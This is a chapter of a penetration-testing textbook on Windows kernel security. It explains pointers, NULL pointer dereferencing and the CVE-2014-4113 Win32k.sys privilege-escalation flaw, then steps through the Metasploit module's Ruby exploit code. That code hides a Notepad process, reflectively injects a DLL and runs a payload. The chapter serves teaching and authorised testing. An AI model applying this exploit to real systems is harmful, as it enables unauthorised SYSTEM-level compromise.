<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer274">
<h1 id="_idParaDest-241"><em class="italic"><a id="_idTextAnchor240"/>Chapter 13</em>: Windows Kernel Security</h1>
<p>The kernel is the colonel of the operating system. It’s the software that allows the <strong class="bold">Operating System</strong> (<strong class="bold">OS</strong>) to link applications to hardware, translating application requests into instructions for the CPU. In fact, it’s hard to distinguish an operating system per se from its kernel; it is the heart of the OS. A bug in a user’s application may cause crashes, instability, slowness, and so on, but a bug in the kernel can crash the entire system. An even more devastating potential is arbitrary code execution with the highest privileges available on the OS. Kernel attacks are a hacker’s dream.</p>
<p>Absolutely everything in an OS works with the kernel in some form. As the core of the OS, the kernel requires isolation from the less-privileged processes on the system; without isolation, it could be corrupted, and a corrupt kernel renders the system unusable. This isolation is accomplished by rendering the kernel’s space in memory as off-limits to processes on the user side. Despite this, full isolation would make the computer useless for users and their applications – interfaces are a necessity. These interfaces create doorways for the attacker into the highest privilege level possible on a Windows computer.</p>
<p>An in-depth discussion of the Windows NT kernel is out of scope for this chapter, but we’ll introduce kernel security concepts and step through a Metasploit exploit module against the Windows kernel to better understand how it works. We’ll provide a hands-on introduction to exploiting a kernel vulnerability to elevate privileges on a Windows target. </p>
<p>In this chapter, we’ll cover the following:</p>
<ul>
<li>An overview of kernel concepts and attacks</li>
<li>The concept of pointers to illustrate null pointer flaws</li>
<li>Code from the Metasploit module to exploit the CVE-2014-4113 vulnerability</li>
<li>A demonstration of leveraging this module for privilege escalation after gaining a foothold on a Windows 7 target</li>
</ul>
<h1 id="_idParaDest-242"><a id="_idTextAnchor241"/>Technical requirements</h1>
<p>The technical requirements for this chapter are as follows:</p>
<ul>
<li>Kali Linux</li>
<li>A Windows 7 target PC or virtual machine</li>
<li>WinDbg for further debugging study (not necessary to complete the exercise)</li>
<li>The IDA disassembler for analyzing binaries and drivers (not necessary to complete the exercise)</li>
</ul>
<h1 id="_idParaDest-243"><a id="_idTextAnchor242"/>Kernel fundamentals – understanding how kernel attacks work</h1>
<p>A crucial philosophical point to remember is that the kernel is a computer program. It’s a construct that can be rather intimidating for us lowly noobs, so it helps to remember the true <a id="_idIndexMarker909"/>nature of the beast. The casual flaws you learn about in ordinary programming can all occur in kernel code. The kernel occupies memory, just like any ordinary program, so the potential to put something where it doesn’t belong and execute it exists. If this is the case, what makes the kernel so special? The kernel manages all low-level functions by interfacing the hardware of a computer and the software of an OS. There are many, many different programs running on a modern instance of Windows, and they all want to use one processor at the same time. The programs can’t decide who gets how much time, and the processor dumbly completes operations – it can’t decide, either. It’s the kernel that functions as the cop, managing all the high-level interactions with the lowest-level structures of the system. The next time you’re marveling at the multitasking ability of a computer that isn’t actually capable of multitasking, thank the kernel for providing that illusion to you.</p>
<p>Windows is an example of an OS that uses a dual-mode architecture – user and kernel (sometimes called user and supervisor). Thus, the memory space is split into two halves, and user mode cannot access kernel space. Kernel mode, on the other hand, has the highest authority and can access any part of the system and hardware. The kernel is ultimately the mediator between the actual hardware and the OS. In Windows, the interface with hardware is provided <a id="_idIndexMarker910"/>by the <strong class="bold">Hardware Abstraction Layer</strong> (<strong class="bold">HAL</strong>), which, as the name suggests, creates a layer of abstraction to, for instance, normalize differences in hardware. Kernel mode drivers provide interfaces for applications requesting access to hardware; even something taken for granted such as an application wishing to display data on the screen must work with a kernel mode driver. The beauty of these structures is they create a layer of abstraction and a single familiar environment for applications to work with. A Windows developer doesn’t <a id="_idIndexMarker911"/>need to worry about the different monitors that may be displaying their program to the user:</p>
<div>
<div class="IMG---Figure" id="_idContainer265">
<img alt="Figure 13.1 – How Windows interacts with hardware " height="420" src="image/Figure_13.1_B17616.jpg" width="465"/>
</div>
</div>
<p class="figure-caption">Figure 13.1 – How Windows interacts with hardware</p>
<h2 id="_idParaDest-244"><a id="_idTextAnchor243"/>Kernel attack vectors</h2>
<p>The security implications of the kernel are both profound in the sense of potential impact and the <a id="_idIndexMarker912"/>extremely low-level activity happening within the kernel, and also straightforward in the sense that the kernel is software written by people (say no more). Some attack vectors that we consider when examining the kernel concept are as follows:</p>
<ul>
<li><strong class="bold">APIs</strong>: If the kernel <a id="_idIndexMarker913"/>doesn’t allow some means for applications to access its functionality, there’s no point in a computer and we might as well all go home. The potential exists via the APIs for arbitrary code to be executed in kernel mode, giving an attacker’s shellcode all the access it needs for total compromise. </li>
<li><strong class="bold">Paddling upstream from hardware</strong>: If you examine the design of the Windows OS, you’ll notice that you can get intimate with the kernel in a more direct <a id="_idIndexMarker914"/>way from the hardware side of the system hierarchy. Malicious driver design can exploit the mechanisms that map the hardware device into virtual memory space.</li>
<li><strong class="bold">Undermining the boot process</strong>: The OS has to be brought up at boot time, and this <a id="_idIndexMarker915"/>is a vulnerable time for the system. If the boot flow can be arbitrarily controlled, it may be possible to attack the kernel before various self-protections are initialized. </li>
<li><strong class="bold">Rootkits</strong>: A kernel-mode rootkit in Windows typically looks like a kernel-mode driver. Successful <a id="_idIndexMarker916"/>coding of such malware is a very delicate balancing act due to the nature of the kernel’s code; couple that with modern protections such as driver signing, and this is getting harder and harder to pull off. It isn’t impossible though, and regardless, older OSs are still a reality in many environments. It’s important for the pen tester to be aware of the attacks that the security industry likes to describe as <em class="italic">on their way out the door</em>.</li>
</ul>
<h2 id="_idParaDest-245"><a id="_idTextAnchor244"/>The kernel’s role as a time cop</h2>
<p>There are various pieces of magic that a modern OS needs to perform, and the kernel is the magician. One example <a id="_idIndexMarker917"/>is context switching, which is a technique that allows numerous processes to share a single CPU. Context switching is the actual work of putting a running thread on hold and storing it in memory, getting another thread up and running with CPU resources, and then putting the second thread on hold and storing it in memory before recalling the first thread. There’s no way around the fact that this takes time to do, so some of the latency in a processor is found in context switching; one of the innovations in OSs is developing ways to cut this time down as much as possible.</p>
<p>Of course, we’re rarely fortunate enough to have to worry about just two little threads trying to run on the same processor – there are often dozens waiting, so the task of prioritizing becomes necessary. Prioritizing threads is a part of the work of the scheduler. The scheduler decides who gets what slice of time with the processor and when. What if a process doesn’t want to give up its time with the processor? In a cooperative multitasking OS, the process needs to be finished with resources before they will be released. On the other hand, in a preemptive multitasking OS, the scheduler can interrupt a task <a id="_idIndexMarker918"/>and resume it later. I’m sure you can imagine the security implications of an OS that’s unable to context switch with a thread that refuses to relinquish resources. Thankfully, modern OSs are typically preemptive. In fact, in the case of Windows, the kernel itself is preemptive – this simply means that even tasks running in kernel mode can be interrupted.</p>
<p>Even young children can grasp one of the fundamental rules of existence – events don’t always happen at once, and you often have to wait for something to happen. You have to go to school for a whole week before the fun of the weekend starts. Even at the extraordinarily small scale of the tiny slices of time used in context switching and scheduling, sometimes we have to wait around for something to happen before we can proceed. Programmers and reverse engineers alike will see these time-dependent constructs in code:</p>
<ol>
<li>Grab the value of the <strong class="source-inline">VAR</strong> variable; use an <strong class="source-inline">if</strong>/<strong class="source-inline">then</strong> statement to establish a condition based on this fetched value.</li>
<li>Grab the value of the <strong class="source-inline">VAR</strong> variable; use it in a function according to the condition(s) established in <em class="italic">step 1</em>.</li>
<li>Grab the value of the <strong class="source-inline">VAR</strong> variable; use it in a function according to the condition(s) established in <em class="italic">step 1</em> and <em class="italic">step 2</em>, and so on.</li>
</ol>
<p>Imagine if we could create a condition that would cause these dependencies to occur out of their prescribed order. For example, what if I could cause <em class="italic">step 2</em> to happen first? In this case, the code is expecting a condition to have been established already. An attacker may <a id="_idIndexMarker919"/>thus trigger an exploit by racing against the established order – this is called a <strong class="bold">race condition</strong>.</p>
<h2 id="_idParaDest-246"><a id="_idTextAnchor245"/>It’s just a program</h2>
<p>From a security perspective, one of the most crucial points to understand about the kernel is that it’s <a id="_idIndexMarker920"/>technically a program made up of code. The real distinction between a flaw in the kernel and a flaw in code on the user side is the privilege; any piece of code running at the kernel level can own the system because the kernel <em class="italic">is</em> the system.</p>
<p>Crashing the kernel results in an irrecoverable situation (namely, it requires a reboot), whereas crashing a user application just requires restarting the application – so, exploring kernel attacks is more precarious and there is far less room for mistakes. It’s still just a computer program, though. I emphasize this because we can understand the kernel attack in this chapter from a programmer’s perspective. The kernel is written in a mix of assembly and C (which is useful due to its low-level interface ability), so let’s take a look at a basic programming concept from a C and assembly point of view before we dive into exploiting our Windows target.</p>
<h1 id="_idParaDest-247"><a id="_idTextAnchor246"/>Pointing out the problem – pointer issues</h1>
<p>Programming languages make use of different data types: numeric types such as integers, Boolean types <a id="_idIndexMarker921"/>to convey true and false, sets and arrays as composite data types, and so on. Pointers are yet another kind of data type – a reference. References are values that refer to data indirectly. For example, suppose I have a book with a map of each of the states of the United States on each page. If someone asks me where I live, I could say <em class="italic">page 35</em> – an indirect reference to the data (the state map) on that particular page. References as a data type are, in themselves, simple, but the datum to which a reference refers can itself be a reference. Imagine the complexity that is possible with this cute little object.</p>
<h2 id="_idParaDest-248"><a id="_idTextAnchor247"/>Dereferencing pointers in C and assembly</h2>
<p>Pointers, as <a id="_idIndexMarker922"/>a reference data type, are considered <a id="_idIndexMarker923"/>low-level because their values are used as memory addresses. A pointer points at a datum, and the actual memory address of the datum is therefore the value of the pointer. The action of using the pointer to access the datum <a id="_idIndexMarker924"/>at the defined memory address is called <strong class="bold">dereferencing</strong>. Let’s take a look at a sample C program that plays around with pointers and dereferencing, and then a quick peek at the assembly of the compiled program:</p>
<pre class="source-code">#include &lt;stdio.h&gt;</pre>
<pre class="source-code">int main(int argc, char **argv)</pre>
<pre class="source-code">{</pre>
<pre class="source-code">    int x = 10;</pre>
<pre class="source-code">    int *point = &amp;x;</pre>
<pre class="source-code">    int deref = *point;</pre>
<pre class="source-code">    printf("\nVariable x is currently %d. *point is %d.\n\n", x, deref);</pre>
<pre class="source-code">    *point = 20;</pre>
<pre class="source-code">    int dereftwo = *point;</pre>
<pre class="source-code">    printf("After assigning 20 to the address referenced by point, *point is now %d.\n\n", dereftwo);</pre>
<pre class="source-code">    printf("x is now %d.\n\n", x);</pre>
<pre class="source-code">}</pre>
<p>The <a id="_idIndexMarker925"/>compiled <a id="_idIndexMarker926"/>program generates this output:</p>
<div>
<div class="IMG---Figure" id="_idContainer266">
<img alt="Figure 13.2 – The output of our pointer program " height="152" src="image/Figure_13.2_B17616.jpg" width="648"/>
</div>
</div>
<p class="figure-caption">Figure 13.2 – The output of our pointer program</p>
<p>Our following assembly examples are 64-bit (hence, for example, <strong class="source-inline">RBP</strong>), but the concepts are the same. However, we’re sticking with Intel syntax despite working in Linux, which uses AT&amp;T syntax – this is to stay consistent with the previous chapter’s introduction to assembly. Remember, source and destination operands are reversed in AT&amp;T notation!</p>
<p>Take a look at what happens at key points in the assembled program. Declaring the <strong class="source-inline">x</strong> integer causes a spot in memory to be allocated for it. <strong class="source-inline">int x = 10;</strong> looks like this in assembly:</p>
<pre class="source-code">mov    DWORD PTR [rbp-20], 10</pre>
<p>Thus, the <strong class="source-inline">10</strong> value <a id="_idIndexMarker927"/>is moved into the <strong class="source-inline">4</strong>-byte location <a id="_idIndexMarker928"/>at the base pointer, minus <strong class="source-inline">20</strong>. Easy enough. (Note that the actual size of the memory allocated for our variable is defined here – <strong class="source-inline">DWORD</strong>. A double word is 32 bits, or 4 bytes, long.) But now, check out what happens when we get to <strong class="source-inline">int *point = &amp;x;</strong> where we declare the int pointer, <strong class="source-inline">*point</strong>, and assign it the actual memory location of <strong class="source-inline">x</strong>:</p>
<pre class="source-code">lea    rax, [rbp-20]</pre>
<pre class="source-code">mov    QWORD PTR [rbp-8], rax</pre>
<p>The <strong class="source-inline">lea</strong> instruction <a id="_idIndexMarker929"/>means <strong class="bold">load effective address</strong>. Here, the <strong class="source-inline">RAX</strong> register is the destination, so what’s really being said here is to put the address of the minus <strong class="source-inline">20</strong> base pointer into the <strong class="source-inline">RAX</strong> register. Next, the value in <strong class="source-inline">RAX</strong> is moved to the quadword of memory (8 bytes) at the minus <strong class="source-inline">8</strong> base pointer. So far, we set aside 4 bytes of memory at the minus <strong class="source-inline">20</strong> base pointer and placed the <strong class="source-inline">10</strong> integer there. Then, we took the 64-bit address of this integer’s location in memory and placed that value into memory at the minus <strong class="source-inline">8</strong> base pointer. In short, the <strong class="source-inline">x</strong> integer is now at <strong class="source-inline">RBP - 20</strong>, and the address at <strong class="source-inline">RBP - 20</strong> is now stored as a pointer in <strong class="source-inline">RBP - 8</strong>.</p>
<p>When we dereference the pointer with <strong class="source-inline">int deref = *point;</strong>, we see this in assembly:</p>
<pre class="source-code">mov    rax, QWORD PTR [rbp-8]</pre>
<pre class="source-code">mov    eax, DWORD PTR [rax]</pre>
<pre class="source-code">mov    DWORD PTR [rbp-12], eax</pre>
<p>To understand these instructions, let’s quickly review the registers. Remember that <strong class="source-inline">EAX</strong> is a 32-bit register in IA-32 architecture; it’s an extension of the 16-bit <strong class="source-inline">AX</strong>. In x64 architecture, <strong class="source-inline">RAX</strong> is a 64-bit register, but remember that being backward-compatible, it follows the same principle – <strong class="source-inline">RAX</strong> is an extension of <strong class="source-inline">EAX</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer267">
<img alt="Figure 13.3 – 64-bit registers " height="374" src="image/Figure_13.3_B17616.jpg" width="575"/>
</div>
</div>
<p class="figure-caption"> </p>
<p class="figure-caption">Figure 13.3 – 64-bit registers</p>
<p>The square <a id="_idIndexMarker930"/>brackets, <strong class="source-inline">[ ]</strong>, distinguish the contents of a <a id="_idIndexMarker931"/>memory location or register. So first, we’re putting the quadword value pointed to by <strong class="source-inline">RBP - 8</strong> into the <strong class="source-inline">RAX</strong> register, then we’re loading the <strong class="source-inline">DWORD</strong> value that <strong class="source-inline">RAX</strong> is pointing to into the <strong class="source-inline">EAX</strong> register, and finally, the <strong class="source-inline">DWORD</strong> in <strong class="source-inline">EAX</strong> is placed in a <strong class="source-inline">DWORD</strong>-sized chunk of the memory at the minus <strong class="source-inline">12</strong> base pointer.</p>
<p>Remember that <strong class="source-inline">RBP - 8</strong> contained the address of our integer, <strong class="source-inline">x</strong>. So, as you can see in the assembly code, we managed to get that integer stored in another place in memory by pointing to a pointer that was pointing at our integer.</p>
<h2 id="_idParaDest-249"><a id="_idTextAnchor248"/>Understanding NULL pointer dereferencing</h2>
<p>Now that we’ve reviewed pointer basics, we can define NULL pointer dereferencing – it’s when <a id="_idIndexMarker932"/>a program uses a pointer to access the memory <a id="_idIndexMarker933"/>location to which it points (dereference), but the pointer’s value is NULL. If you try to recall from our introduction to shellcoding, our program tried to access <strong class="source-inline">0x7a7a7a7a</strong> when we overwrote the return with the ASCII letter <strong class="source-inline">z</strong>, so in the case of a NULL pointer, an invalid location in memory is trying to be accessed. The difference is that we aren’t overwriting the pointer value with arbitrary bytes; it’s NULL – an address that simply doesn’t exist. The result is always some sort of a fault, but the resulting behavior can be unpredictable. With this being the case, why are we concerned with NULL pointer dereferencing? </p>
<p>I know what the hacker in you is saying, <em class="italic">it’s pretty obvious that exploiting a NULL pointer dereference vulnerability results in a denial of service</em>. Perhaps, grasshopper, but it’s a little more complicated than that. For one, the memory addresses starting at <strong class="source-inline">0x00000000</strong> may or may not be mapped – that is, if a NULL pointer’s <a id="_idIndexMarker934"/>value is literally zero, it may be possible to end up in a legitimate memory location. If it isn’t a valid memory location, we get a crash; but if it is valid, and there’s some tasty shellcode waiting there, then we have ourselves code execution. Another scenario to consider is that the pointer is not properly validated before being dereferenced. The actual value may not be NULL in this case, but the attack is effectively the same. For our analysis, we’ll pick on a well-known Windows vulnerability from 2014 – CVE-2014-4113.</p>
<p>Probably <a id="_idIndexMarker935"/>the most common way of referring to known vulnerabilities is with their <strong class="bold">Common Vulnerabilities and Exposures</strong> (<strong class="bold">CVE</strong>) designation. The CVE is a catalog of software-based threats sponsored by the US federal government. Vulnerabilities are defined as flaws that can give an attacker direct access to systems or data, whereas an exposure is a flaw that allows indirect access to systems or data. The CVE convention is <strong class="source-inline">CVE-&lt;year&gt;-&lt;ID number&gt;</strong>. </p>
<h2 id="_idParaDest-250"><a id="_idTextAnchor249"/>The Win32k kernel-mode driver</h2>
<p>CVE-2014-4113 is <a id="_idIndexMarker936"/>also known by its Microsoft security bulletin <a id="_idIndexMarker937"/>designation, MS14-058. It is an <strong class="bold">Elevation of Privilege</strong> (<strong class="bold">EoP</strong>) vulnerability in the kernel-mode driver <strong class="source-inline">Win32k.sys</strong>. I don’t <a id="_idIndexMarker938"/>know if the name <strong class="source-inline">Win32k.sys</strong> makes this apparent, but a bug in this particular driver is very bad news for a Windows system.</p>
<p>The <strong class="source-inline">Win32k.sys</strong> driver is the kernel side of some core parts of the Windows subsystem. Its main functionality is the GUI of Windows; it’s responsible for window management. Any program that needs to display something doesn’t talk to graphics hardware <a id="_idIndexMarker939"/>directly. Instead, it interfaces via the <strong class="bold">Graphics Device Interface</strong> (<strong class="bold">GDI</strong>), which is managed by <strong class="source-inline">Win32k.sys</strong>. User mode window <a id="_idIndexMarker940"/>management talks to <strong class="source-inline">Win32k.sys</strong> through User32 DLLs from the <strong class="bold">Client/Server Runtime Subsystem</strong> (<strong class="bold">CSRSS</strong>) user-side service. Drivers provide access for entities to their functionality via entry points, and <strong class="source-inline">Win32k.sys</strong> has about 600 of them. This highly complex interaction and core functionality make security a bit of a nightmare for something like <strong class="source-inline">Win32k.sys</strong>.</p>
<p>This is a <a id="_idIndexMarker941"/>highly simplified depiction of the place of <strong class="source-inline">Win32k.sys</strong> in the Windows kernel and its relationship to userland: </p>
<div>
<div class="IMG---Figure" id="_idContainer268">
<img alt="Figure 13.4 – Win32k.sys interaction with the kernel " height="804" src="image/Figure_13.4_B17616.jpg" width="1063"/>
</div>
</div>
<p class="figure-caption">Figure 13.4 – Win32k.sys interaction with the kernel</p>
<p>Note that <a id="_idIndexMarker942"/>this depiction also physically relates to memory, as userland is the lower portion of memory (at the top of the figure), and kernel land occupies the upper portion. <strong class="source-inline">0x00000000</strong> to <strong class="source-inline">0x7FFFFFFF</strong> is user space, and application virtual memory spaces occupy certain regions within it; the remainder, <strong class="source-inline">0x80000000</strong> to <strong class="source-inline">0xFFFFFFFF</strong>, is the almighty kernel. Windows design is not dumb – you can’t just arbitrarily execute something in kernel land: </p>
<div>
<div class="IMG---Figure" id="_idContainer269">
<img alt="Figure 13.5 – Exploiting Win32k.sys " height="668" src="image/Figure_13.5_B17616.jpg" width="950"/>
</div>
</div>
<p class="figure-caption">Figure 13.5 – Exploiting Win32k.sys</p>
<p>What we <a id="_idIndexMarker943"/>hope to accomplish is tricking code <a id="_idIndexMarker944"/>running in kernel mode to execute our payload within user space. We don’t need to trespass in the kernel’s backyard to get something running with the kernel’s high privileges.</p>
<h2 id="_idParaDest-251"><a id="_idTextAnchor250"/>Passing an error code as a pointer to xxxSendMessage()</h2>
<p>There’s a lot of complexity in <strong class="source-inline">Win32k.sys</strong>, and we don’t have time to even scratch the <a id="_idIndexMarker945"/>surface, so let’s hone in on the vulnerable structures that we will be attacking with our module in the next <a id="_idIndexMarker946"/>section. Remember that <strong class="source-inline">Win32k.sys</strong> is largely responsible for window management, including handling requests <a id="_idIndexMarker947"/>from applications to output something to a display. There’s a function inside <strong class="source-inline">Win32k.sys</strong> called <strong class="source-inline">xxxMNFindWindowFromPoint()</strong> that is used to identify the window that is occupying a particular location on the screen (a point, given in <em class="italic">X</em> and <em class="italic">Y</em> coordinates). This function will return the memory address of a C++ structure called <strong class="source-inline">tagWND</strong> (<strong class="source-inline">WND</strong> means window; this is all window management), but if there’s an error, the function returns error codes – <strong class="source-inline">-1</strong> and <strong class="source-inline">-5</strong>. In a classic programming oversight, the caller of this function does check for the return of <strong class="source-inline">-1</strong>, but there isn’t a check for <strong class="source-inline">-5</strong>. As long as the zero flag isn’t set when the following simple comparison is executed – <strong class="source-inline">cmp ebx,0FFFFFFFFh</strong> – the program happily continues, knowing that it has a valid memory pointer returned from the called function. The invalid pointer vulnerability is born.</p>
<p>Let’s take a look at the flow of execution through <strong class="source-inline">Win32k.sys</strong> with IDA. In my IDA session with the driver, I identify <strong class="source-inline">sub_BF8B959D</strong> as the <strong class="source-inline">xxxSendMessage()</strong> function (<strong class="source-inline">sub</strong> stands for subroutine). The critical moment is visible in <strong class="source-inline">loc_BF9392D8</strong> (<strong class="source-inline">loc</strong> for location in memory):</p>
<pre class="source-code">cmp    ebx, 0FFFFFFFFh</pre>
<pre class="source-code">jnz    short loc_BF9392EB</pre>
<p>The <a id="_idIndexMarker948"/>value in the <strong class="source-inline">EBX</strong> register is checked against the <strong class="source-inline">-1</strong> value (note the hexadecimal value is a signed integer; hence <strong class="source-inline">0xFFFFFFFF</strong> is equal to <strong class="source-inline">-1</strong>). <strong class="source-inline">jnz</strong> jumps if the zero flag is not set; remember, that’s <a id="_idIndexMarker949"/>just assembly talk for <a id="_idIndexMarker950"/>a jump to the specified location if the two compared values are <em class="italic">not</em> the same.</p>
<p>Let’s do a quick review of conditional jumps in assembly. The principles of <em class="italic">jump if zero</em> or <em class="italic">jump if not zero</em> refer to the result of a comparison. Suppose you have the <strong class="source-inline">x</strong> and <strong class="source-inline">y</strong> variables. It’s a plain logical statement that <strong class="source-inline">x - x = 0</strong>. Therefore, if <strong class="source-inline">x - y = 0</strong>, then we know that <strong class="source-inline">x = y</strong>. <strong class="source-inline">jnz</strong> and <strong class="source-inline">jz</strong> will check the zero flag in the flags register to check the result of the comparison. </p>
<p>So, if the value in <strong class="source-inline">EBX</strong> is not <strong class="source-inline">-1</strong>, then we jump to <strong class="source-inline">loc_BF9392EB</strong>:</p>
<pre class="source-code">push    0</pre>
<pre class="source-code">push    [ebp+arg_8]</pre>
<pre class="source-code">push    1Edh</pre>
<pre class="source-code">push    ebx</pre>
<pre class="source-code">call    sub_BF8B959D</pre>
<p>Let’s take a look at this in IDA.</p>
<div>
<div class="IMG---Figure" id="_idContainer270">
<img alt="Figure 13.6 – A crucial test in IDA " height="403" src="image/Figure_13.6_B17616.jpg" width="756"/>
</div>
</div>
<p class="figure-caption">Figure 13.6 – A crucial test in IDA</p>
<p>Recall that <a id="_idIndexMarker951"/>in my specific IDA session <a id="_idIndexMarker952"/>here, <strong class="source-inline">sub_BF8B959D</strong> is the <strong class="source-inline">xxxSendMessage</strong> function. The simplest way to put this is that <strong class="source-inline">xxxSendMessage</strong> will be called if <strong class="source-inline">EBX</strong> contains anything other than <strong class="source-inline">-1</strong>. The <strong class="source-inline">-5</strong> value is not checked against <strong class="source-inline">EBX</strong> before the call. By returning <strong class="source-inline">-5</strong> into the flow at this point, we <a id="_idIndexMarker953"/>can pass it to the <strong class="source-inline">xxxSendMessage</strong> function as a parameter. <strong class="source-inline">-5</strong> represented as a hexadecimal value looks like <strong class="source-inline">0xFFFFFFFB</strong>. In this particular parameter, <strong class="source-inline">xxxSendMessage</strong> is expecting a pointer. If the exploit works, execution will try to jump to the memory location, <strong class="source-inline">0xFFFFFFFB</strong>. Part of the exploit’s job is to land us on the NULL page with an offset. The exploit will have already mapped some space in the NULL page before this point, so ultimately, execution jumps to shellcode waiting in user space. (As is often the case, Windows allows NULL page mapping for backward-compatibility reasons.) Now, I know what the hacker in you is saying: <em class="italic">It seems like disabling NULL page mapping would stop this attack right in its tracks</em>. A job well done as you’d be right, and Microsoft thought of that – NULL page mapping is disabled by default, starting in Windows 8.</p>
<p>There aren’t enough pages to do a deep dive into this particular vulnerability, but I hope I’ve given you enough background to try this out – get on your vulnerable Windows 7 VM <a id="_idIndexMarker954"/>and nab the driver (it’s in <strong class="source-inline">System32</strong>), open it up in IDA, and follow the flow of execution. See if you <a id="_idIndexMarker955"/>can understand what’s happening in the other functions in play here. Try keeping a running map of the registers and their values, and use the <strong class="source-inline">push</strong> and <strong class="source-inline">pop</strong> operations to understand the stack in real time. IDA is the perfect tool for this analysis. I have a feeling you’ll be hooked.</p>
<h2 id="_idParaDest-252"><a id="_idTextAnchor251"/>Metasploit – exploring a Windows kernel exploit module</h2>
<p>Now that <a id="_idIndexMarker956"/>we have a little background, we’re going to watch the attack in action with Metasploit. The exploit module specific to this vulnerability is called <strong class="source-inline">exploit/windows/local/ms14_058_track_popup_menu</strong> (recall that MS14-058 is the Microsoft security bulletin designation for this flaw). Note that this exploit falls under the <strong class="source-inline">local</strong> subcategory. The nature of this flaw requires that we are able to execute a program as a privileged user – this is a local attack, as opposed to a remote attack. Sometimes, you’ll see security publications discuss local exploits with phrases such as <em class="italic">the risk is limited by the fact that the attacker must be local to the machine</em>. The pen tester in you should be chuckling at this point because you know that the context of distinguishing local from remote essentially removes the human factor sitting at the keyboard. If we can convince the user to take some action, we’re as good as local. These local attacks can become remotely controlled with just a little finesse.</p>
<p>Before we get to the fun stuff, let’s examine the Metasploit module in detail so that we understand how it works. As always, we need to take a look at the <strong class="source-inline">include</strong> lines so that we can review the functionality that’s being imported into this module:</p>
<pre class="source-code">require 'msf/core/post/windows/reflective_dll_injection'</pre>
<pre class="source-code">class MetasploitModule &lt; Msf::Exploit::Local</pre>
<pre class="source-code">    Rank = NormalRanking</pre>
<pre class="source-code">    include Msf::Post::File</pre>
<pre class="source-code">    include Msf::Post::Windows::Priv</pre>
<pre class="source-code">    include Msf::Post::Windows::Process</pre>
<pre class="source-code">    include Msf::Post::Windows::FileInfo</pre>
<pre class="source-code">    include Msf::Post::Windows::ReflectiveDLLInjection</pre>
<p>So, we have several Windows post-exploit modules loaded here: <strong class="source-inline">File</strong>, <strong class="source-inline">Priv</strong>, <strong class="source-inline">Process</strong>, <strong class="source-inline">FileInfo</strong>, and <strong class="source-inline">ReflectiveDLLInjection</strong>. I won’t bog you down by dumping the code from all five post modules here, but you should always consider a proper review of the included modules as a requirement. Recall that the <strong class="source-inline">include</strong> statement makes those modules mixins whose parameters are directly referenceable within this parent module.</p>
<p>Back to the parent module – we’re going to skip over the first two defined methods, <strong class="source-inline">initialize(info={})</strong> and <strong class="source-inline">check</strong>. You will remember that the <strong class="source-inline">info</strong> initialization provides useful information for the user, but this isn’t necessary for the module <a id="_idIndexMarker957"/>to function. The most practical purpose of this is making keywords available to the search function within <strong class="source-inline">msfconsole</strong>. The <strong class="source-inline">check</strong> method is also not strictly necessary, but it makes this module available to the compatibility checking functionality of Metasploit. When a target is selected, you can load an exploit and check whether the target is probably vulnerable. Personally, I find the check functionality to be nifty and potentially a timesaver, but in general, I would never recommend relying on it.</p>
<p>Now, at long last – the <strong class="source-inline">exploit</strong> method. Please note that the method starts with some error checking that we’re skipping over; it makes sure we aren’t already <strong class="source-inline">SYSTEM</strong> (just in case you’re still racing after crossing the finish line!), and it checks that the session host architecture and the options-defined architecture match:</p>
<pre class="source-code">def exploit</pre>
<pre class="source-code">    print_status('Launching notepad to host the exploit...')</pre>
<pre class="source-code">    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' =&gt; true})</pre>
<pre class="source-code">    begin</pre>
<pre class="source-code">        process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)</pre>
<pre class="source-code">        print_good("Process #{process.pid} launched.")</pre>
<pre class="source-code">  rescue Rex::Post::Meterpreter::RequestError</pre>
<pre class="source-code">        print_error('Operation failed. Trying to elevate the current process...')</pre>
<pre class="source-code">        process = client.sys.process.open</pre>
<pre class="source-code">    end</pre>
<p>The method starts with an attempt to launch Notepad. Note that the <strong class="source-inline">{'Hidden' =&gt; true}</strong> argument is passed to <strong class="source-inline">execute</strong>. This ensures that Notepad will execute but the friendly editor window won’t actually appear for the user (which would certainly tip off the user that something is wrong). We then handle the successful launch of Notepad and nab the process ID for the next stage of the exploit; alternatively, <strong class="source-inline">rescue</strong> comes to the rescue to handle the failure to launch Notepad and instead nabs the currently open process for the next stage.</p>
<p>DLLs <a id="_idIndexMarker958"/>are the Windows implementation of the shared library model. They are executable code that can be shared by programs. For all intents and purposes, they should be regarded as executables. The main difference from EXE files is that DLLs require an entry point that is provided by a running program. From a security perspective, DLLs are very dangerous because they are loaded in the memory space of the calling process, which means they have the same permissions as the running process. If we can inject a malicious DLL into a privileged process, this is pretty much game over.</p>
<p>And now, our big finale – reflective DLL injection. DLLs are meant to be loaded into the memory space of a process, so DLL injection is simply forcing this with our chosen DLL. However, since a DLL is an independent file in its own right, DLL injection typically involves pulling the DLL’s code off of the disk. Reflective DLL injection allows us to source code straight out of memory. Let’s take a look at what our module does with reflective DLL injection in the context of our <strong class="source-inline">Win32k.sys</strong> exploit:</p>
<pre class="source-code">    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")</pre>
<pre class="source-code">   if target.arch.first == ARCH_X86</pre>
<pre class="source-code">        dll_file_name = 'cve-2014-4113.x86.dll'</pre>
<pre class="source-code">    else</pre>
<pre class="source-code">        dll_file_name = 'cve-2014-4113.x64.dll'</pre>
<pre class="source-code">    end</pre>
<pre class="source-code">    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4113', dll_file_name)</pre>
<pre class="source-code">    library_path = ::File.expand_path(library_path)</pre>
<pre class="source-code">    print_status("Injecting exploit into #{process.pid}...")</pre>
<pre class="source-code">    exploit_mem, offset = inject_dll_into_process(process, library_path)</pre>
<pre class="source-code">    print_status("Exploit injected. Injecting payload into #{process.pid}...")</pre>
<pre class="source-code">    payload_mem = inject_into_process(process, payload.encoded)</pre>
<pre class="source-code">    print_status('Payload injected. Executing exploit...')</pre>
<pre class="source-code">    process.thread.create(exploit_mem + offset, payload_mem)</pre>
<pre class="source-code">    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')</pre>
<pre class="source-code">end</pre>
<p>Let’s <a id="_idIndexMarker959"/>examine this step by step and skip over the status printouts:</p>
<ul>
<li>First, the <strong class="source-inline">if...else</strong> <strong class="source-inline">target.arch.first == ARCH_X86</strong> statement. This is self-explanatory – the module is pulling an exploit DLL from the Metasploit <strong class="source-inline">Data\Exploits</strong> folder, and this check allows for the architecture to be targeted correctly.</li>
